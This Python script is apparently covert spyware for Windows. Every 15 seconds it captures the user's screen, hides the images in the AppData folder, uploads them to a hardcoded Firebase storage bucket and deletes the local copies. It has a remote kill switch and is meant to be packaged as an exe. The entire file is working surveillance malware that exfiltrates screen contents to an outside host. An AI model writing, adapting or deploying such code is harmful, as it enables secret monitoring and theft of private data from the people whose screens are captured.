import subprocess
import threading
import pyscreenshot
import pyrebase
import os

firebaseConfig = {
    "apiKey": "AIzaSyAk0xzpUuH0LYXihigz3OXentCn1T8YC3Q",
    "authDomain": "global-testing-env.firebaseapp.com",
    "databaseURL": "https://global-testing-env-default-rtdb.firebaseio.com",
    "projectId": "global-testing-env",
    "storageBucket": "global-testing-env.appspot.com",
    "messagingSenderId": "403456253125",
    "appId": "1:403456253125:web:129423ef3a31c45a5a24ac"
}

firebase = pyrebase.initialize_app(firebaseConfig)
storage = firebase.storage()

# save files to C:\\Users\\fortyseven\\AppData\\Roaming\\output\\
files_location = os.environ["AppData"] + "\\output"

i = 0


def grab_screenshot():
    global i
    # To capture the screen
    image = pyscreenshot.grab()

    if not os.path.exists(files_location):
        os.makedirs(files_location)

    # To save the screenshot
    image.save(files_location + f"\\file_{i}.jpeg", quality=50)
    print("Image Saved")
    stop_screentap()
    upload_firebase()
    i += 1


def upload_firebase():
    if os.path.exists(files_location + f"\\file_{i}.jpeg"):
        cloud_path = f"images/file_{i}.jpeg"
        local_path = (files_location + f"\\file_{i}.jpeg")
        storage.child(cloud_path).put(local_path)
        print("Image Uploaded")
        # remove the file after sending it to cloud
        os.remove(files_location + f"\\file_{i}.jpeg")
        print("Image Removed")


# stopper function, run stopper.py to upload an image which will then trigger this function and the program will stop running
def stop_screentap():
    #program name should be same as the final exe name
    program_name = 'your_final_program_name.exe'
    storage.child('images/stop_screentap.jpeg').download('', 'stop_screentap.jpeg')
    if os.path.exists("stop_screentap.jpeg"):
        subprocess.call('taskkill /IM "' + program_name + '" /F', shell=True)
        print("Screentap Stopped")
        os.remove('stop_screentap.jpg')
        print("File Removed!")


# creating a thread for calling a function after certain time
def multi_thread_grab():
    grab_screenshot()
    # run this thread every 15secs
    timer = threading.Timer(15, multi_thread_grab)
    timer.start()


multi_thread_grab()
